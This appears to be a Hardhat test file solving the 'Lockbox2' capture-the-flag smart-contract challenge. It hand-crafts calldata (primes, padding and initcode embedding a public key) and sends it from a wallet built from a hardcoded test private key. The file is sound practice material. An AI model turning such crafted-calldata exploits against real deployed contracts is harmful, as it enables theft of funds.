import { ethers } from "hardhat";
import { expect } from "chai";
import { BigNumber } from "ethers";

const utils = ethers.utils;

describe("[Challenge] Lockbox2", function () {
    let deployer, attacker;
    let provider;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const SetupFactory = await ethers.getContractFactory(
            "SetupLockbox2",
            deployer
        );
        this.challenge = await SetupFactory.deploy();

        expect(await this.challenge.isSolved()).to.equal(false);
        provider = ethers.provider
    });

    it("Exploit", async function () {
        /** CODE YOUR EXPLOIT HERE */
        const Lockbox2LikeFactory = await ethers.getContractFactory(
            "Lockbox2Like",
            deployer
        );
        const lockbox2 = await Lockbox2LikeFactory.deploy();
        //account_pubkey
        const account_pubkey = '00512e1544b18e466e9d0939c92b726757eeb87f6ca265be5e134a0dd64264c9d0fe416bfb86f5b9e8c15487ffa7fd9d31f23b64bec083d188a6a610b686ccc6' //gotten from scripts/pubkeyBytecode.py
        //account_pubkey
        const account_privkey = 'cf492f0f1e8c3d072ab465af22a1be2d01d095b2f592b6d0a81ba36493e22571'//gotten from scripts/pubkeyBytecode.py
        //const pKey = new ethers.Wallet.createRandom();
        //const signer = new ethers.Wallet(pKey, provider);
        const sender = new ethers.Wallet(account_privkey, provider)
        console.log("sender address", sender.address)
        //sender.connect(provider)

        let data =  "0x890d6908"                                                                // solve() function selector
        data += "0000000000000000000000000000000000000000000000000000000000000061"          // 97 (prime number)
        data += "00000000000000000000000000000000000000000000000000000000000001af"          // 431 (prime number)
        data += "0000000000000000000000000000000000000000000000000000000000000001"          // 1
        data += "000000000000000000000000000000000000000000000000000000000000000100"        // 1 (followed by two zeroes so that bytes in stage 4 isn't too long)
        data += `7f${account_pubkey.slice(0,64)}6000527f${account_pubkey.slice(64)}60205260406000f3`     // initcode to create contract with pub_key as bytecode
        data += Array(998 - data.length).fill(0).join('') 

        await deployer.sendTransaction({ to: sender.address, value: utils.parseEther('100') });
        //const gasPrice = (await provider.getGasPrice());
        //console.log("gasPrice", gasPrice, typeof(gasPrice));
        const txPms = {
            //from: sender.address,
            to: lockbox2.address,
            value: '0x0',
            data,
            gasLimit: utils.hexlify(650988),
            //gasPrice: utils.hexlify(await provider.getGasPrice()),
            accessList: [
              [
                  lockbox2.address,
                  [
                      "0x0000000000000000000000000000000000000000000000000000000000000000",
                  ]
              ]
            ],
            nonce: utils.hexlify(await provider.getTransactionCount(sender.address, "latest"))
        };
        /*const tx = TransactionFactory.fromTxData(txPms, {common});
        // sign the transaction
        tx.sign(Buffer.from(account_privkey, "hex"));
        let rawTransaction = "0x" + tx.serialize().toString("hex")
        console.log("rawTransaction", rawTransaction)*/
        //let rawTransaction = await sender.signTransaction(txPms).then(utils.serializeTransaction(transaction));

        //const { hash: transactionHash } = await provider.sendTransaction(rawTransaction);        
        //const transactionHash = await provider.send('eth_sendTransaction', [txPms])
        const { hash: transactionHash } = await sender.sendTransaction(txPms)

        console.log('transactionHash is ' + transactionHash)
        //await provider.waitForTransaction(hash);
        //await provider.send('eth_getTransactionByHash', [transactionHash])
        console.log(await lockbox2.locked())
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        expect(await this.challenge.isSolved()).to.equal(true);
    });
});